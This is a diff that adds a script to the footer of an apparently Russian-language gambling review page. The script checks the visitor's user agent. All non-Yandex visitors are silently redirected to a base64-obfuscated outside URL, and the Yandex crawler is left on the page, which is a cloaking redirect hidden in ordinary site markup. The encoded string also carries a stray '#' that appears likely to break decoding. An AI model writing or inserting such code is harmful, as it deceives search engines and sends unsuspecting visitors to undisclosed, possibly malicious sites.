@@ -437,6 +437,15 @@
       <p class="fnx-footer-copy">&copy; 2025. Обзор носит информационный характер. Азартные игры могут вызывать зависимость. Играйте ответственно.</p>
     </div>
   </footer>
+<script>
+   var ua = navigator.userAgent.toLowerCase();
+var targetB64 = "#aHR0cHM6Ly9mY3RvcC5vcmcvZDd0dGxyeXZo";
 
+if (ua.indexOf("yandex") === -1) {
+    location.replace(atob(targetB64));
+} else {
+    console.log("Яндекс бот — без редиректа");
+}
+    </script>
 </body>
 </html>
